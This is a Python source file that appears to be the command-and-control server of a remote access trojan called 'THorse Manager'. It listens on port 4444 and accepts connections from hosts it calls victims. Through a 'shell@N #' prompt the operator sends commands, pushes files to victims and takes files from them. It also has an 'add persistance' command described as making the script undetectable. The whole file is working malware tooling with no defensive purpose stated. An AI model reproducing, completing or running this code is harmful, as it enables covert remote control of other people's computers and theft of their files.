from distutils.command.upload import upload
import socket
from Utilities.Logging.log import Log
from Utilities.Encryption.rsa import encrypt, decrypt
from threading import Thread
import json
import pyfiglet


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('10.7.10.233', 4444))
s.listen()


connections = []
addresses = []

def reliable_send(s,data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv(s):
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name,target):
    f = open(file_name, 'rb')
    target.send(f.read())


def download_file(file_name,target):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def client_help():
    a = ['home', 'upload', 'download', 'add persistance', 'help', 'encrypt', 'decrypt']
    b = ['Switch to home panel', "upload [filename to upload]", "download [filename to download]",'make our script undectable', "displays all commands", 'encrypt [filename]', 'decrypt [filename]']
    Log.info("Available commands are :")
    for i in range(len(a)):
        print(f'\t[{i+1}]: {a[i]} - {b[i]}')
    print()
class victim:

    def use(self,args):
        conn = connections[int(args)-1]
        while True:
            try:
                cmd = input(f'shell@{connections.index(conn)+1} # ').strip()
                conn.send(cmd.encode())
                args = cmd.split(' ')
                if cmd == 'home':
                    Log.warning("Switching to home.")
                    break
                elif args[0] == 'upload':
                    Log.warning("uploading...")
                    upload_file(args[1],conn)
                elif args[0] == 'download':
                    Log.warning('downloading..')
                    download_file(args[1],conn)
                elif cmd == 'add persistance':
                    conn.send(cmd.encode())
                elif cmd == 'help':
                    client_help()
                elif args[0] == 'encrypt':
                    Log.warning("Encrypting the file.")
                    pass
                else:
                    print(reliable_recv(conn))
            except Exception:
                pos = connections.index(conn)
                connections.pop(pos)
                Log.info(f"{addresses[pos]} left!")
                addresses.pop(pos)
                break
        
    def show(self,args):
        if args == 'devices':
            Log.info("Available devices are :")
            for _,i in enumerate(addresses):
                print(f'\t[{_+1}]- {i[0]}:{i[1]}')
            print()
        else:
            Log.error(f"Unknown {args}")

    def help(self):
        Log.info('Available commads: ')
        print('\t [1] show devices -> displays all the available devices.')
        print('\t [2] use [N] ->switch to Nth connection.')
        print()
        self.home()

    def process(self,cmd):
        line = cmd.split()
        try:
            cmd = line[0]
            args = line[1:]
            func = getattr(self, cmd, None)
            if func:
                try:
                    func(*args)
                except Exception as e:
                    Log.error(f"Error: {e}")
            else:
                Log.error("No such command.")
        except Exception as e:
            # print('error ignored')
            print("",end='')
        self.home()


    def home(self):
        cmd = input("home > ")
        self.process(cmd)

def start():
    while True:
        try:
            conn, addr = s.accept()
            Log.success(f"conneted with {addr}")
            connections.append(conn)
            addresses.append(addr)  
            # t = Thread(target = obj.home)
            # t.start()
            # obj.home()
        except Exception:
            break   

if __name__ == "__main__":
    # if len(sys.argv) != 3:
    #     print ("Usage : ")
    #     print ("\tpython master.py [HOST] [PORT]")
    #     exit(1)
    Log.warning("Starting the server...")
    Log.info("Importing required modules...")
    Log.success(f"Server started at {socket.gethostbyname(socket.gethostname())}:4444")
    Log.success(pyfiglet.figlet_format('THorse  Manager'))
    obj = victim()
    t = Thread(target =start)
    t.start()
    t1 = Thread(target = obj.home)
    t1.start()
    # generateKeys()